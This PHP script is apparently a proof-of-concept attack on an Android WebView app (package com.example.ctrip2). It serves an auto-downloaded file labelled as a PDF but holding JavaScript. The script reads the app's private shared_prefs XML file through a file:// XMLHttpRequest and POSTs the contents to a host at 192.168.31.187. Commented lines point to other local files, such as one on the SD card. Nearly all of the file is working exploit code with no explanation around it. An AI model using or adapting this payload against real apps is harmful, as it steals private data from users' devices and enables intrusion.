<?php
//autodown.php
//header("Content-Disposition: attachment:filename=autodown.htm"); 
//$data="111111111111111111111";
//echo $data;
//echo "0000000000000";
//echo "0000000000000";

//autodown.php
//header("Content-Disposition: attachment:filename=autodown.htm"); 
//file:///data/data/com.example.ctrip2/shared_prefs/WebViewChromiumPrefs.xml
//file:///sdcard/16/11.txt
//header("Content-Type: binary/octet-stream"); 
header("Content-Type: application/pdf");
$data=<<<android_xss_go
<script>var xhr = new XMLHttpRequest;
xhr.onload = function(){
	var txt = xhr.responseText;
	alert(txt);
	var xhr2 = new XMLHttpRequest;
	xhr2.open('POST', 'http://192.168.31.187/autodown.php');
	xhr2.send(txt);
	xhr2.onload = function(){
		alert('okok');
	}
};
xhr.open('GET','file:///data/data/com.example.ctrip2/shared_prefs/WebViewChromiumPrefs.xml');
xhr.send(null);</script>
android_xss_go;
print $data;
?>